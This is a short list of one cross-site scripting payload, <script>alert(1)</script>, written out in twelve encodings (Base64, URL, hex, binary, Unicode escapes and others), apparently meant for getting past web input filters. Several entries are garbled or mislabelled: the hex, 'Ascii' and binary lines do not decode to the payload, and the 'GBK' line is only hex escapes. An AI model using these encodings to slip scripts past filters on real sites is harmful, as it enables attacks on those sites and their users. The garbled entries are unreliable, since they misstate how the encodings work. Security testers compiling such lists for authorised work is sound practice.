1. Base64 encoding: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
2. URL encoding: %3Cscript%3Ealert%281%29%3C%2Fscript%3E
3. Hex encoding: 3C7363726970743E616C65727432831293C2F7363726970743E
4. Ascii encoding: <6073 6372 6970 743e 616c 6572 7428 3129 3c2f 7363 7269 7074 3e
5. UTF-8 encoding: %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
6. Binary encoding: 00111100 01110011 01110010 01101001 01110000 01110100 00111111 01100001 01101100 01100101 01110010 01110100 00111010 00111001 00111010 00110111 00110101 00111000 00101110 01111000 01110011 01110010 01101001 01110000 01110100 00111101
7. Escape encoding: \u003Cscript\u003Ealert(1)\u003C\u002Fscript\u003E
8. HTML encoding: &lt;script&gt;alert(1)&lt;/script&gt;
9. Quoted-printable encoding: =3Cscript=3Ealert(1)=3C/script=3E
10. JSON encoding: "\u003Cscript\u003Ealert(1)\u003C/script\u003E"
11. Unicode: \u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E
12. GBK: \x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x31\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E
